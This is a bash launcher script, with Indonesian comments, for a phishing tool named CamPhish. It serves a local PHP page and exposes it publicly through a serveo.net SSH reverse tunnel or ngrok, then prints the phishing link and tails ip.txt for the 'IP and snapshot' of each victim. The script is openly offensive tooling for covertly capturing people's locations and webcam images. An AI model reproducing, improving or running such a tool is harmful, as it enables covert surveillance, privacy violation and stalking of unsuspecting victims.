#!/bin/bash
# CamPhish v1.0 - Adrian (No Khodam Video)
# Versi Final

trap 'echo; stop' 2

stop() {
    echo "[*] Membersihkan proses..."
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    pkill -f ngrok >/dev/null 2>&1
    exit 1
}

dependencies() {
    command -v php >/dev/null 2>&1 || { echo "[!] PHP belum terinstall!"; exit 1; }
    command -v ssh >/dev/null 2>&1 || { echo "[!] SSH belum terinstall!"; exit 1; }
}

banner() {
    clear
    echo -e "\e[1;92m====================================\e[0m"
    echo -e "\e[1;93m        CAMPHISH v1.0 - Adrian      \e[0m"
    echo -e "\e[1;92m====================================\e[0m"
}

start_php() {
    fuser -k 3333/tcp >/dev/null 2>&1
    php -S localhost:3333 >/dev/null 2>&1 &
    sleep 2
}

start_serveo() {
    echo "[*] Memulai Serveo..."
    [[ -f sendlink ]] && rm sendlink
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
    sleep 8
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    echo "[+] Serveo link: $link"
    echo "[*] Menunggu IP dan snapshot user..."
    tail -f ip.txt
}

start_ngrok() {
    command -v ngrok >/dev/null 2>&1 || { echo "[!] Ngrok belum terinstall!"; exit 1; }
    echo "[*] Memulai Ngrok..."
    ./ngrok http 3333 >/dev/null 2>&1 &
    
    echo "[*] Menunggu Ngrok URL..."
    while true; do
        link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
        if [[ -n "$link" ]]; then
            break
        fi
        sleep 2
    done
    echo "[+] Ngrok link: $link"
    echo "[*] Menunggu IP dan snapshot user..."
    tail -f ip.txt
}

select_tunnel() {
    echo "----- Pilih Tunnel -----"
    echo "[1] Serveo.net"
    echo "[2] Ngrok"
    read -p "[Default 1] Pilih: " option
    option="${option:-1}"
}

banner
dependencies
start_php
select_tunnel

if [[ $option -eq 1 ]]; then
    start_serveo
elif [[ $option -eq 2 ]]; then
    start_ngrok
else
    echo "[!] Pilihan tidak valid. Menggunakan Serveo default."
    start_serveo
fi
